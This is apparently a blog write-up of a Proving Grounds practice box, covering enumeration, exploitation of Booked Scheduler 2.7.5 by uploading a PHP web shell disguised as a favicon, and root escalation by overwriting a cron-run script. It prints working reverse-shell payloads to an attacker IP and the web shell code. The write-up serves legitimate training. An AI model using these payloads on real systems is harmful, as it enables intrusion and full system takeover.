---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Performing a `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -sV 192.168.126.64 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 10:33 EST
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 10:34 (0:00:06 remaining)
Nmap scan report for 192.168.126.64
Host is up (0.027s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=2/11%Time=620681DF%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLi
SF:nes,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetReque
SF:st,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptio
SF:ns,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPReque
SF:st,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBi
SF:ndReqTCP,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNS
SF:StatusRequestTCP,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(Help,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SS
SF:LSessionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(
SF:TerminalServerCookie,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\
SF:x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20se
SF:rver")%r(TLSSessionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126
SF:'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20
SF:server")%r(Kerberos,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x
SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser
SF:ver")%r(SMBProgNeg,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x2
SF:0is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serv
SF:er")%r(X11Probe,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.126'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:);
Service Info: Host: ZINO; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds
```

## port 21 (`ftp`)
> No anonymous access allowed.
{: .prompt-danger }

## port 22 (`ssh`)
> No weak credentials identified, `root` login is disabled or only private key authentication is enabled.
{: .prompt-danger }

## port 139/445 (`smb`)
### enumerating and downloading share content
Show shares.
```bash
$ smbclient -L 192.168.126.64
Enter WORKGROUP\void's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        zino            Disk      Logs
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

```

Connect to share `zino`.
```bash
$ smbclient //192.168.126.64/zino -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul  9 15:11:49 2020
  ..                                  D        0  Tue Apr 28 09:38:53 2020
  .bash_history                       H        0  Tue Apr 28 11:35:28 2020
  error.log                           N      265  Tue Apr 28 10:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 09:38:53 2020
  local.txt                           N       33  Fri Feb 11 10:30:51 2022
  .bashrc                             H     3526  Tue Apr 28 09:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 10:17:02 2020
  .profile                            H      807  Tue Apr 28 09:38:53 2020
  misc.log                            N      424  Tue Apr 28 10:08:15 2020
  auth.log                            N      368  Tue Apr 28 10:07:54 2020
  access.log                          N     5464  Tue Apr 28 10:07:09 2020
  ftp                                 D        0  Tue Apr 28 10:12:56 2020

                7158264 blocks of size 1024. 4726704 blocks available
```

Download juicy looking files.
```bash
smb: \> get error.log
getting file \error.log of size 265 as error.log (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
smb: \> get local.txt
getting file \local.txt of size 33 as local.txt (0.3 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> get .bashrc
getting file \.bashrc of size 3526 as .bashrc (33.8 KiloBytes/sec) (average 12.2 KiloBytes/sec)
smb: \> get .profile
getting file \.profile of size 807 as .profile (7.7 KiloBytes/sec) (average 11.1 KiloBytes/sec)
smb: \> get misc.log
getting file \misc.log of size 424 as misc.log (4.1 KiloBytes/sec) (average 9.7 KiloBytes/sec)
smb: \> get access.log
getting file \access.log of size 5464 as access.log (50.8 KiloBytes/sec) (average 16.7 KiloBytes/sec)
```

### juicy content
`misc.log` reveals credentials
```
Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
```
> Admin credentials: `admin:adminadmin`
{: .prompt-info }

`access.log` shows that there is another service on the target
```
192.168.234.30 - - [28/Apr/2020:08:26:05 -0400] "GET / HTTP/1.1" 200 664 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:06 -0400] "GET /icons/blank.gif HTTP/1.1" 200 431 "http://192.168.234.130:8003/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:06 -0400] "GET /icons/folder.gif HTTP/1.1" 200 508 "http://192.168.234.130:8003/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
...
```
> There is a web service on port `8000` which provides the web application `Booked Scheduler v2.7.5`
{: .prompt-info }

---

# exploitation
## finding an exploit
```bash
$ searchsploit Booked Scheduler       
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Booked Scheduler 2.7.5 - Remote Command Execution (Metasploit)                                                                                                                                            | php/webapps/46486.rb
Booked Scheduler 2.7.7 - Authenticated Directory Traversal                                                                                                                                                | php/webapps/48428.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There is a metasploit module available exploiting a remote code execution vulnerability (`Booked Scheduler 2.7.5 - Remote Command Execution (Metasploit)`).  
However, we will perform a manual exploitation of this vulnerability.

## exploit
After reviewing the exploit we can break down the exploitation to the following steps.
1. create a simple `php` shell named `fav.ico` (file content: `<?php system($_REQUEST['cmd']); ?>`)
2. upload `fav.ico` via `http://192.168.126.64:8003/booked/Web/admin/manage_theme.php` as a favicon
3. Access the shell via crafted `GET` request

### `RCE` PoC request
```http
GET /booked/Web/custom-favicon.php?cmd=whoami HTTP/1.1
Host: 192.168.126.64:8003
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ad1a321tub0vkcugr0dsehmllh; new_version=v%3D2.7.5%2Cfs%3D1644593980
Connection: close
```

### `RCE` PoC response
```http
HTTP/1.1 200 OK
Date: Fri, 11 Feb 2022 15:58:31 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 9
Connection: close
Content-Type: text/html; charset=UTF-8

www-data
```

> Got a shell!
{: .prompt-info }

## post exploitation
### get reverse shell
> A lot outgoing ports are filtered.
{: .prompt-danger }

> Port `8003` is allowed for outgoing connections.
{: .prompt-info }

reverse shell payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.174/8003 0>&1'`

#### start listener on attacker machine
```bash
$ nc -lvp 8003
listening on [any] 8003 ...
```

#### execute reverse shell
```bash
GET /booked/Web/custom-favicon.php?cmd=bash%20-c%20%27bash%20-i%20>%26%20%2fdev%2ftcp%2f192%2e168%2e49%2e174%2f8003%200>%261%27 HTTP/1.1
Host: 192.168.174.64:8003
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=gj43975vng5nhdc2gdjs1hhscr; new_version=v%3D2.7.5%2Cfs%3D1644596651
Connection: close
```

#### catch connect from target
```bash
$ nc -lvp 8003
listening on [any] 8003 ...
192.168.174.64: inverse host lookup failed: Unknown host
connect to [192.168.49.174] from (UNKNOWN) [192.168.174.64] 43140
bash: cannot set terminal process group (621): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zino:/var/www/html/booked/Web$ whoami
whoami
www-data
```

### get first flag
```bash
www-data@zino:/var/www/html/booked/Web$ cd /home
cd /home
www-data@zino:/home$ ls
ls
peter
www-data@zino:/home$ cd peter
cd peter
www-data@zino:/home/peter$ ls
ls
access.log
auth.log
error.log
ftp
local.txt
misc.log
www-data@zino:/home/peter$ cat local.txt
cat local.txt
1******************************d
```

### privielege escalation

```bash
www-data@zino:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
#
www-data@zino:/tmp$ ls -lsah /var/www/html/booked/cleanup.py
ls -lsah /var/www/html/booked/cleanup.py
4.0K -rwxrwxrwx 1 www-data www-data 100 Feb 11 13:00 /var/www/html/booked/cleanup.py
```

> There is a `cronjob` which is vulnerable to a local privilege escalation as it is executed by `root` and the executed file is world writeable.
{: .prompt-info }

Vulnerable `cronjob`: `*/3 *   * * *   root    python /var/www/html/booked/cleanup.py`  
Now we are overwriting the `cleanup.py` file with a back connect python script to get a `root` shell

new `cleanup.py` content:
```python
#!/usr/bin/env python
import os

os.system("bash -c 'bash -i >& /dev/tcp/192.168.49.174/21 0>&1'")
```

Start a listener on the attacker machine and wait a few minutes for the back connect
```bash
$ nc -lvp 21
listening on [any] 21 ...
192.168.174.64: inverse host lookup failed: Unknown host
connect to [192.168.49.174] from (UNKNOWN) [192.168.174.64] 43914
bash: cannot set terminal process group (1380): Inappropriate ioctl for device
bash: no job control in this shell
root@zino:~# whoami
whoami
root
```

### get second flag
```
root@zino:~# cd /root
cd /root
root@zino:~# ls
ls
proof.txt
root@zino:~# cat proof.txt
cat proof.txt
e******************************8
```

Pwned! <@:-)
